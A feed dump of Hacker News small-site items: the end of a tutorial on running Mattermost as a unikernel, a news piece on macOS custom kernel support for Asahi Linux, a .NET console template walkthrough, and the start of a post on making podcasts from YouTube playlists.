2021-01-11T17:45:55.097471Z 0 [Note] Found ca.pem, server-cert.pem and server-key.pem in data directory. Trying to enable SSL support using them.
2021-01-11T17:45:55.100836Z 0 [Note] Skipping generation of SSL certificates as certificate files are present in data directory.
2021-01-11T17:45:55.105239Z 0 [Warning] CA certificate ca.pem is self signed.
2021-01-11T17:45:55.107312Z 0 [Note] Skipping generation of RSA key pair as key files are present in data directory.
2021-01-11T17:45:55.110568Z 0 [Note] Server hostname (bind-address): '0.0.0.0'; port: 3306
2021-01-11T17:45:55.112817Z 0 [Note]   - '0.0.0.0' resolves to '0.0.0.0';
2021-01-11T17:45:55.114596Z 0 [Note] Server socket created on IP: '0.0.0.0'.
2021-01-11T17:45:55.116577Z 0 [Warning] Insecure configuration for --pid-file: Location '/var/lib/mysql' in the path is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:55.136775Z 0 [Note] Event Scheduler: Loaded 0 events
2021-01-11T17:45:55.138651Z 0 [Note] mysqld: ready for connections.
Version: '5.7.29-0ubuntu0.18.04.1-log'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
</code></pre>

<p>We should be able to connect to the server and create a mattermost
database:</p>

                <pre><code>mysql -u root -h 192.168.42.19
create datbase mattermost;</code></pre>

<p>Ops load by default will re-build the image each time so if you want
to skip that you can pass the '-s' flag or use 'ops instance create' instead.</p>

                <h3>Running MatterMost as a Unikernel</h3>

<p>For mattermost we'll want to edit the mattermost config.json (not to
be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>‚ûú ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20
warning: overwriting existing file /config/config.json hostpath old: /home/eyberg/.ops/.staging/mattermost_5.12.0/sysroot/config/config.json new: config/config.json
[mattermost -c config/config.json --disableconfigwatch]
booting /home/eyberg/.ops/images/mattermost.img ...
assigned: 192.168.42.20
{"level":"info","ts":1610387180.047103,"caller":"utils/i18n.go:83","msg":"Loaded system translations for 'en' from '/i18n/en.json'"}
{"level":"info","ts":1610387180.0498981,"caller":"app/server_app_adapters.go:58","msg":"Server is initializing..."}
{"level":"error","ts":1610387180.0560362,"caller":"app/server_app_adapters.go:69","msg":"Failed to parse server templates function not implemented"}
{"level":"info","ts":1610387180.0593297,"caller":"sqlstore/supplier.go:224","msg":"Pinging SQL master database"}
{"level":"info","ts":1610387180.231293,"caller":"sqlstore/upgrade.go:104","msg":"The database schema has been set to version 5.12.0"}
{"level":"error","ts":1610387204.4853191,"caller":"app/server_app_adapters.go:125","msg":"SiteURL must be set. Some features will operate incorrectly if the SiteURL is not set. See documentation for details: http://about.mattermost.com/default-site-url"}
{"level":"info","ts":1610387204.5032592,"caller":"filesstore/localstore.go:33","msg":"Able to write files to local storage."}
{"level":"info","ts":1610387204.7344124,"caller":"app/license.go:41","msg":"License key from https://mattermost.com required to unlock enterprise features."}
{"level":"info","ts":1610387204.982482,"caller":"app/migrations.go:26","msg":"Migrating roles to database."}
{"level":"info","ts":1610387208.7359424,"caller":"sqlstore/post_store.go:1277","msg":"Post.Message supports at most 16383 characters (65535 bytes)"}
{"level":"info","ts":1610387209.2314367,"caller":"app/migrations.go:102","msg":"Migrating emojis config to database."}
{"level":"info","ts":1610387246.2326972,"caller":"mlog/log.go:164","msg":"Starting up plugins"}
{"level":"info","ts":1610387246.241575,"caller":"app/server.go:213","msg":"Current version is 5.12.0 (5.12.0/Sat Jun 15 09:02:50 UTC 2019/bfd66aa445a2df8c6ed6b a9f2567021ecf6c9f3b/403add5df2a572f676fd9da85ad80623cb00b88a)"}
{"level":"info","ts":1610387246.2597792,"caller":"app/server.go:214","msg":"Enterprise Enabled: true"}
{"level":"info","ts":1610387246.267642,"caller":"app/server.go:216","msg":"Current working directory is /"}
{"level":"info","ts":1610387246.276085,"caller":"app/server.go:217","msg":"Loaded config","source":"file:///config/config.json"}
{"level":"info","ts":1610387246.9817462,"caller":"jobs/workers.go:68","msg":"Starting workers"}
{"level":"info","ts":1610387246.989871,"caller":"app/server.go:413","msg":"Starting Server..."}
{"level":"info","ts":1610387246.9986944,"caller":"app/server.go:479","msg":"Server is listening on [::]:8065"}
{"level":"info","ts":1610387247.0144029,"caller":"jobs/schedulers.go:72","msg":"Starting schedulers."}
{"level":"info","ts":1610387247.0446193,"caller":"app/web_hub.go:75","msg":"Starting 2 websocket hubs"}
</code></pre>

<p>If everything works you'll see the login/setup page for mattermost!</p>

            <center><img src="https://nanovms.com/static/dist/img/tutorials/mattermost.png"></center>

      </div></div>]]>
            </description>
            <link>https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792618</guid>
            <pubDate>Fri, 15 Jan 2021 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A flashcard deck for New Keynesian macroeconomics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792583">thread link</a>) | @mvind
<br/>
January 15, 2021 | https://memordo.com/app/public/325 | <a href="https://web.archive.org/web/*/https://memordo.com/app/public/325">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://memordo.com/app/public/325</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792583</guid>
            <pubDate>Fri, 15 Jan 2021 16:25:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS beta adds custom kernel support, closer to installing other OSS on M1 Macs]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25792565">thread link</a>) | @CharlesW
<br/>
January 15, 2021 | https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It‚Äôs an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you‚Äôre dedicated to reverse-engineer Apple‚Äôs software for Macs, it‚Äôs a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn‚Äôt originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, ‚Äúthe OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.‚Äù He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>‚Äî Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that‚Äôs specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-10599" data-id="10599" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/macbook-pro-and-ipad-pro-with-mini-led-displays-coming-in-the-first-half-of-2021/" title="iPad-Pro-1"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-100x100.jpg" alt="iPad Pro 1" srcset="https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-724x724.jpg 724w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-1039x1039.jpg 1039w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple‚Äôs VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, ‚Äúthat‚Äôs really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that‚Äôs a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.‚Äù</p>
<p>The newly added support for custom kernels on Big Sur‚Äôs 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we‚Äôve noted before, Asahi Linux is an independent project that relies on people‚Äôs contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project‚Äôs Patreon</a> to expedite the development.</p>
<p>Let us know your thoughts about this story in the comments section below.</p>
</div></div>]]>
            </description>
            <link>https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792565</guid>
            <pubDate>Fri, 15 Jan 2021 16:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My preferred .NET console stack]]>
            </title>
            <description>
<![CDATA[
Score 195 | Comments 109 (<a href="https://news.ycombinator.com/item?id=25792422">thread link</a>) | @devlead
<br/>
January 15, 2021 | https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack | <a href="https://web.archive.org/web/*/https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    ‚îÇ   MyConsoleApp.csproj
    ‚îÇ   Program.cs
    ‚îÇ
    ‚îî‚îÄ‚îÄ‚îÄCommands
        ‚îÇ   ConsoleCommand.cs
        ‚îÇ
        ‚îú‚îÄ‚îÄ‚îÄSettings
        ‚îÇ       ConsoleSettings.cs
        ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄValidation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>
</blockquote>
<pre><code>using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Devlead.Console.Commands;
using Spectre.Console.Cli;
using Spectre.Cli.Extensions.DependencyInjection;

var serviceCollection = new ServiceCollection()
    .AddLogging(configure =&gt;
            configure
                .AddSimpleConsole(opts =&gt; {
                    opts.TimestampFormat = "yyyy-MM-dd HH:mm:ss ";
                })
    );

using var registrar = new DependencyInjectionRegistrar(serviceCollection);
var app = new CommandApp(registrar);

app.Configure(
    config =&gt;
    {
        config.ValidateExamples();

        config.AddCommand&lt;ConsoleCommand&gt;("console")
                .WithDescription("Example console command.")
                .WithExample(new[] { "console" });
    });

return await app.RunAsync(args);
</code></pre>
<h2 id="consolecommand.cs">ConsoleCommand.cs</h2>
<p><code>ConsoleCommand.cs</code> contains "just" your business code, <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> handles the heavy lifting of parsing and validating command-line arguments (<em>based on provided settings class, more on that later in the post.</em>), resolving constructor parameters using dependency injection, etc. Letting you focus on the domain and not the boilerplate code, resulting in a very similar experience to i.e. Azure Function or .NET Workers, enabling reuse of both patterns and code. <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> has support for both async and sync commands.</p>
<pre><code>using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyConsoleApp.Commands.Setting;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands
{
    public class ConsoleCommand : AsyncCommand&lt;ConsoleSettings&gt;
    {
        private ILogger Logger { get; }

        public override async Task&lt;int&gt; ExecuteAsync(CommandContext context, ConsoleSettings settings)
        {
            Logger.LogInformation("Mandatory: {Mandatory}", settings.Mandatory);
            Logger.LogInformation("Optional: {Optional}", settings.Optional);
            Logger.LogInformation("CommandOptionFlag: {CommandOptionFlag}", settings.CommandOptionFlag);
            Logger.LogInformation("CommandOptionValue: {CommandOptionValue}", settings.CommandOptionValue);
            return await Task.FromResult(0);
        }

        public ConsoleCommand(ILogger&lt;ConsoleCommand&gt; logger)
        {
            Logger = logger;
        }
    }
}
</code></pre>
<h2 id="consolesettings.cs">ConsoleSettings.cs</h2>
<p><code>ConsoleSettings.cs</code> contains the definition of what parameters each command has, if they're are mandatory/optional, positional and how they validated. It also contains metadata used for automatically generating help and error messages.</p>
<pre><code>using System.ComponentModel;
using Devlead.Console.Commands.Validate;
using Spectre.Console.Cli;

namespace Devlead.Console.Commands.Setting
{
    public class ConsoleSettings : CommandSettings
    {
        [CommandArgument(0, "&lt;mandatory&gt;")]
        [Description("Mandatory argument")]
        public string Mandatory { get; set; } = string.Empty;

        [CommandArgument(1, "[optional]")]
        [Description("Optional argument")]
        public string? Optional { get; set; }

        [CommandOption("--command-option-flag")]
        [Description("Command option flag.")]
        public bool CommandOptionFlag { get; set; }

        [CommandOption("--command-option-value &lt;value&gt;")]
        [Description("Command option value.")]
        [ValidateString]
        public string? CommandOptionValue { get; set; }
    }
}
</code></pre>
<h2 id="validatestringattribute.cs">ValidateStringAttribute.cs</h2>
<p><a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> can validate either by custom attributes on properties (<em>see <code>ConsoleSettings.CommandOptionValue</code> for an example of that</em>) or globally by overriding <code>Validate()</code> method on <code>CommandSettings</code>. The template ships with a sample <code>ValidateStringAttribute</code> that just validates the length of a string, but you can make it as advanced as you want.</p>
<pre><code>using Spectre.Console;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands.Validation
{
    public class ValidateStringAttribute : ParameterValidationAttribute
    {
        public const int MinimumLength = 3;

        public ValidateStringAttribute() : base(errorMessage: null)
        {
        }

        public override ValidationResult Validate(ICommandParameterInfo parameterInfo, object? value)
            =&gt; (value as string) switch {
                { Length: &gt;= MinimumLength }
                    =&gt; ValidationResult.Success(),

                { Length: &lt; MinimumLength }
                    =&gt; ValidationResult.Error($"{parameterInfo?.PropertyName} ({value}) needs to be at least {MinimumLength} characters long."),

                _ =&gt; ValidationResult.Error($"Invalid {parameterInfo?.PropertyName} ({value}) specified.")
            };
    }
}
</code></pre>
<h2 id="result">Result</h2>
<p><img src="https://cdn.devlead.se/clipimg-vscode/2021/01/15/devleadmyconsoleapp.gif?sp=rl&amp;st=2021-01-15T09:33:29Z&amp;se=2031-01-16T09:33:00Z&amp;sv=2019-12-12&amp;sr=b&amp;sig=fp8lXgfDwOgGkdK3cYm0fFojddT8ZEx7SJuiIMkIOW8%3D" alt="GIF animation of Console experience"></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code. There's a LOT more to <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> than command-line parsing, to I hight ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</a></em></p>]]>
            </description>
            <link>https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792422</guid>
            <pubDate>Fri, 15 Jan 2021 16:08:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make podcasts out of Project Gutenberg books with Mozilla's Text-to-Speech model]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792367">thread link</a>) | @whatrocks
<br/>
January 15, 2021 | https://www.charlieharrington.com/flow-and-creative-computing | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/flow-and-creative-computing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently watched Pixar's SOUL and I loved its depiction of being <em>in the zone</em>:</p>
<p><span>
      <span></span>
  <img alt="In the Zone" title="In the Zone" src="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png" srcset="https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/222b7/zone.png 163w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/ff46a/zone.png 325w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/a6d36/zone.png 650w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/e548f/zone.png 975w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/3c492/zone.png 1300w,
https://www.charlieharrington.com/static/0aee6e1c7f7c78355cb80e7835703fca/769f8/zone.png 1924w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>This is a beautiful, astrally-projected depiction of Mihaly Csikszentmihalyi's <em>flow</em> concept. For the unfamiliar, here's how Csikszentmihalyi describes flow, or <em>the optimal experience</em>:</p>
<blockquote>
<p>It is what the sailor holding a tight course feels when the wind whips through her hair, when the boat lunges through the waves like a colt -- sails, hull, wind, and sea humming a harmony that vibrates in the sailor's veins. It is what a painter feels when the colors on the canvas begin to set up a magnetic tension with each other, and a new <em>thing</em>, a living form, takes shape in front of the astonished creator.</p>
</blockquote>
<p>That sounds pretty good, right? Csikszentmihalyi contends that flow is how we humans can achieve happiness. And it's not something that's given; it's something we have to cultivate and grow and work towards. I cannot recommend his book enough.</p>
<p>Even better was SOUL's depiction of the non-flow state - the lost souls:</p>
<p><span>
      <span></span>
  <img alt="lost souls" title="lost souls" src="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg" srcset="https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/d2f63/lost-souls.jpg 163w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/c989d/lost-souls.jpg 325w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/6aca1/lost-souls.jpg 650w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/7c09c/lost-souls.jpg 975w,
https://www.charlieharrington.com/static/c8e9d78346f3711671078cfd117b81b8/a2510/lost-souls.jpg 1000w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
    </span></p>
<p>Definitely been there. Usually its whenever I hear, "Can you see my screen?" These poor creatures wander the astral plane, lost and unhappy and unsure why.</p>
<p>Luckily, the movie tells us it's never too late, and I believe them.</p>
<p>So, how do we achieve flow?</p>
<p>It's the deliberate combination of skill meeting challenge. More from Csikszentmihalyi:</p>
<blockquote>
<p>The best moments usually occur when a person's body or mind is stretched to its limits in a voluntary effort accomplish something difficult and worthwhile.</p>
</blockquote>
<p>This post documents a legitimate flow experience I had last week that began with an observation about my podcast addiction.</p>
<h2>All My Best Friends are Podcasts</h2>
<p>Yes, that's a <a href="https://www.youtube.com/watch?v=Z_63ZZRLylE">Less Than Jake</a> reference. You're welcome, 8th-Grade Charlie.</p>
<p>And, if you're at all like 28th-Grade Charlie, then you're also helplessly addicted to podcasts.</p>
<p>I listen all the time -- while I'm washing dishes, folding laundry, performing my daily Amazon cardboard box cutting ritual, even taking showers. Carly doesn't understand it, and I certainly can't explain it.</p>
<p>Am I that afraid of silence? My own thoughts? Am I so lonely for friendship that I even found this evisceration quietly comforting?</p>
<blockquote><p lang="en" dir="ltr">Podcasts saying literally nothing for 20 minutes. <a href="https://t.co/nmfka1Gjsp">pic.twitter.com/nmfka1Gjsp</a></p>‚Äî Jonathan Ogden (@jogdenUK) <a href="https://twitter.com/jogdenUK/status/1346442437376552962?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote> 
<p>I know too much about ancient Rome to be able to answer these questions.</p>
<p>So, if I'm just going to accept my Overcast overlords, can I turn the tides on this one-directional relationship?</p>
<p>Yes. We can. Enter: the spark of an idea.</p>
<h2>Create a podcast from the audio of YouTube videos</h2>
<p>If I can't control what my favorite podcast hosts are talking about in any given episode, can I instead choose <em>exactly</em> what I want to listen to? What if there were a virtually unlimited source of content to consume? Surely, I could then be more deliberate in my listening habits.</p>
<p>YouTube is our answer. I've been collecting computer science talks and lectures in playlists that I always mean to "watch later" and never do. Fact is, I don't want to watch a YouTube video. I rarely ever sit down and "watch YouTube" (other than The 8-Bit Guy cleaning old VIC-20s). It's not part of my routine. I'm usually moving around too much.</p>
<p>YouTube also makes it really hard to consume something "on the go." You need to pay for their PiP or minimized mode, I think.</p>
<p>Then I found this <a href="https://benjamincongdon.me/blog/2020/03/02/Creating-a-Podcast-Feed-from-a-YouTube-Playlist/">post by Benjamin Congdon</a>: a simple way to create an audio podcast feed from a YouTube playlist using a <a href="https://amzn.to/3qksZiq">Raspberry Pi</a> home server. His tutorial leverages an open source project called <a href="https://github.com/mxpv/podsync/">PodSync</a>, which itself leverages <code>ffmpeg</code> and, everyone's favorite controversy, <code>youtube-dl</code>, behind the scenes to download audio from YouTube and generate a podcast RSS feed. This, this, is exactly what I was looking for!</p>
<p>Nothing to add here, other than bravo, Benjamin. I was able to follow his tutorial pretty much straight through.</p>
<p>Wait, I do have something to add. Benjamin suggests using <code>rsync</code> to upload your mp3s and xml RSS feed to s3 or the like. I did this initially, but I didn't like the idea of having to mark these files as <code>public</code> on s3 in case of some huge accidental traffic surge.</p>
<p>So I came up with another idea:</p>
<ul>
<li>Create a public repo on GitHub and enable GitHub Pages (mine is <a href="https://github.com/rockswhat/listener">here</a>)</li>
<li>Init the repo in your <code>/data</code> directory on the Raspberry Pi (this is the directory with the generated <code>.xml</code> RSS feed and <code>mp3</code> audio files)</li>
<li>Change your Podsync config's hostname to your GitHub Pages site: </li>
</ul>
<div data-language="text"><pre><code>hostname = "https://rockswhat.github.io/listener"`</code></pre></div>
<ul>
<li>Change your cron command to push to your repo (instead of <code>rsync</code> to s3):</li>
</ul>
